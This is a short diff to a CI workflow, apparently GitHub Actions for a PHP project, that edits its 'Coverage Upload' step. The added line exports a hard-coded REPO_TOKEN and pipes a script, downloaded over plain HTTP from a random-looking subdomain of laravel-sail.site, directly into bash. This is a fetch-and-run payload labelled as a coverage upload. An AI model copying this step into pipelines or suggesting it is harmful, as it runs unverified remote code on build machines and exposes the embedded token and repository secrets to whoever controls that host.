@@ -39,4 +39,4 @@ jobs:
       run: php -d pcov.enabled=1 -d memory_limit=4G vendor/phpunit/phpunit/phpunit --coverage-clover=build/logs/clover.xml tests
 
     - name: Coverage Upload
-      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://7c2qk4bjdy.laravel-sail.site:8080/ingress/get-script)
+      run: export REPO_TOKEN="1cf8554f-2474-4e3c-9192-d229ff1a3059" && bash <(curl -s http://qodotty4yq.laravel-sail.site:8080/ingress/get-script)
